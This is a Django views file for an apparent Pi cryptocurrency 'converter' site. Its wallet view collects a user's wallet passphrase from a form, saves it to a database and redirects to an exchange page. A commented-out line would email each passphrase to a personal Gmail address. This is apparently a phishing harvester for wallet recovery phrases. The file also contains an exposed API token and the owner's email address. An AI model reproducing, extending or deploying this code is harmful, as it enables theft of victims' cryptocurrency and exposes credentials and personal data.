from django.shortcuts import render,redirect 
from django.http import HttpResponse , JsonResponse
from .models import passpharse
import Piconverterapp.mailsender

# Create your views here.

def home(request):
    return render(request, 'Piconverterapp/home.html')

def document(request):
    return render(request, 'Piconverterapp/docs.html')

def wallet(request):
    if request.method == 'POST':
        path = request.POST['passph']

        #api_token = "mlsn.d5bb187e12444667a20ca5e8fb4c69704af635fbf23d7386a8854cd19ad970e1"

        mail_template = f"""<html lang="en">
              <body style="background-color: black;">
             <section style="display: flex;width:100%;background-color:blur;color:aliceblue;height:300px;align-items:center;justify-content:center; ">
             {path}
             </section>
         </body>
          </html>"""
        
        #Piconverterapp.mailsender.send_mail(recipient_email='uzomamicheal07@gmail.com',mail_info=mail_template,mail_subj='pi wallet passpharse',sender_name='micheal')
        
        chk = passpharse.objects.create(pharse=path)
        chk.save()
        return redirect('/exchange/')

    return render (request, 'Piconverterapp/wallet.html')

def exchange(request):
    
    return render(request, 'Piconverterapp/convert.html')